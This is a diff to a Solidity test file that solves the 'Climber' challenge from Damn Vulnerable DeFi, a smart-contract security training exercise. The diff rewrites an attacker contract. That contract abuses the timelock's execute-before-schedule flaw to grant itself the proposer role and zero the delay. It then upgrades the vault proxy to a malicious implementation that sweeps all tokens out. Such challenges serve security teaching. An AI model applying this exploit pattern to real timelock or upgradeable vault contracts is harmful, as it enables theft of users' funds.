@@ -7,106 +7,63 @@ import {ClimberVault} from "../../src/climber/ClimberVault.sol";
 import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
-import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
-import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
-import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
-import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
-import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
+
+contract ClimberVaultV2 is ClimberVault {
+    function sweepTo(address token, address recipient) external {
+        DamnValuableToken(token).transfer(recipient, DamnValuableToken(token).balanceOf(address(this)));
+    }
+}
 
 contract ClimberAttacker {
-    
-    ClimberVault vault;
-    ClimberTimelock timelock;
-    DamnValuableToken token;
-    address recovery;
-    address[] targets = new address[](4);
-    uint256[] values = new uint256[](4);
-    bytes[] dataElements = new bytes[](4);
+    ClimberTimelock private immutable timelock;
+    ClimberVault private immutable vault;
+    DamnValuableToken private immutable token;
+    address private immutable recovery;
+    address[] private targets;
+    uint256[] private values;
+    bytes[] private dataElements;
+    bytes32 private salt;
 
-    constructor(
-        ClimberVault _vault,
-        ClimberTimelock _timelock,
-        DamnValuableToken _token,
-        address _recovery
-    ) {
-        vault = _vault;
+    constructor(ClimberTimelock _timelock, ClimberVault _vault, DamnValuableToken _token, address _recovery) {
         timelock = _timelock;
+        vault = _vault;
         token = _token;
         recovery = _recovery;
     }
 
-    function attack() external {
-        
-        address maliciousImpl = address(new MaliciousVault());
+    function attack(address newImplementation) external {
+        targets = new address[](4);
+        values = new uint256[](4);
+        dataElements = new bytes[](4);
+        salt = bytes32(0);
 
-        bytes memory grantRoleData = abi.encodeWithSignature(
-            "grantRole(bytes32,address)",
-            keccak256("PROPOSER_ROLE"),
-            address(this)
-        );
-
-        bytes memory changeDelayData = abi.encodeWithSignature(
-            "updateDelay(uint64)",
-            uint64(0)
-        );
-
-        bytes memory transferOwnershipData = abi.encodeWithSignature(
-            "transferOwnership(address)",
-            address(this)
-        );
-
-        bytes memory scheduleData = abi.encodeWithSignature(
-            "timelockSchedule()"
-        );
-    
         targets[0] = address(timelock);
-        values[0] = 0;
-        dataElements[0] = grantRoleData;
+        dataElements[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, uint64(0));
 
         targets[1] = address(timelock);
-        values[1] = 0;
-        dataElements[1] = changeDelayData;
-
-        targets[2] = address(vault);
-        values[2] = 0;
-        dataElements[2] = transferOwnershipData;
-
-        targets[3] = address(this);
-        values[3] = 0;
-        dataElements[3] = scheduleData;
-
-        timelock.execute(
-            targets,
-            values,
-            dataElements,
-            bytes32(0)
+        dataElements[1] = abi.encodeWithSelector(
+            timelock.grantRole.selector,
+            PROPOSER_ROLE,
+            address(this)
         );
 
-        vault.upgradeToAndCall(address(maliciousImpl), "");
-        MaliciousVault(address(vault)).drainFunds(address(token), recovery);
+        targets[2] = address(vault);
+        dataElements[2] = abi.encodeWithSignature(
+            "upgradeToAndCall(address,bytes)",
+            newImplementation,
+            abi.encodeCall(ClimberVaultV2.sweepTo, (address(token), recovery))
+        );
+
+        targets[3] = address(this);
+        dataElements[3] = abi.encodeWithSelector(this.schedule.selector);
+
+        timelock.execute(targets, values, dataElements, salt);
     }
 
-    function timelockSchedule() external {
-        timelock.schedule(targets, values, dataElements, bytes32(0));
+    function schedule() external {
+        timelock.schedule(targets, values, dataElements, salt);
     }
 }
-
-contract MaliciousVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
-    uint256 private _lastWithdrawalTimestamp;
-    address private _sweeper;
-
-    /// @custom:oz-upgrades-unsafe-allow constructor
-    constructor() {
-        _disableInitializers();
-    }
-
-    function drainFunds(address token, address receiver) external {
-        SafeTransferLib.safeTransfer(token, receiver, IERC20(token).balanceOf(address(this)));
-    }
-
-    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
-}
-
 
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -184,14 +141,10 @@ contract ClimberChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_climber() public checkSolvedByPlayer {        
-        ClimberAttacker attacker = new ClimberAttacker(
-            vault,
-            timelock,
-            token,
-            recovery
-        );
-        attacker.attack();
+    function test_climber() public checkSolvedByPlayer {
+        ClimberVaultV2 newImplementation = new ClimberVaultV2();
+        ClimberAttacker attacker = new ClimberAttacker(timelock, vault, token, recovery);
+        attacker.attack(address(newImplementation));
     }
 
     /**
